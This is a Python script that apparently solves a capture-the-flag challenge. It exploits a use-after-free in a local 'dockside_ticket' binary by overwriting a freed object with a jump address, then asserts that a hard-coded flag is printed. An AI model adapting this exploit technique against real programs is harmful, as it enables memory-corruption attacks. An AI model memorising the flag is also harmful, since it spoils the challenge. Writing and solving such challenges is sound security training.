#!/usr/bin/env python3
"""Local-only proof of the Dockside Ticket Office use-after-free exploit."""

import struct
import subprocess
import os
import select


payload = b"A" * 0x20 + struct.pack("<Q", 0x40125F)  # open_gate entry
process = subprocess.Popen(
    ["/lib64/ld-linux-x86-64.so.2", "./dockside_ticket"],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
)


def read_until(marker: bytes) -> bytes:
    output = bytearray()
    while marker not in output:
        readable, _, _ = select.select([process.stdout], [], [], 2)
        if not readable:
            raise TimeoutError(f"No output before {marker!r}: {output!r}")
        chunk = os.read(process.stdout.fileno(), 4096)
        if not chunk:
            raise EOFError(f"Exited before {marker!r}: {output!r}")
        output.extend(chunk)
    print(output.decode(errors="replace"), end="")
    return bytes(output)


read_until(b"> ")
for command in (b"1\n", b"2\n", b"3\n"):
    process.stdin.write(command)
    process.stdin.flush()
    read_until(b"Enter new ticket data:\n" if command == b"3\n" else b"> ")
process.stdin.write(payload)
process.stdin.flush()
read_until(b"> ")
process.stdin.write(b"4\n")
process.stdin.flush()
scan = read_until(b"> ")
assert b"CSSCTF{us3_4ft3r_fr33_d0cks1d3}" in scan
process.stdin.write(b"5\n")
process.stdin.flush()
read_until(b"Goodbye.\n")
process.stdin.close()
process.wait(timeout=2)
raise SystemExit(process.returncode)
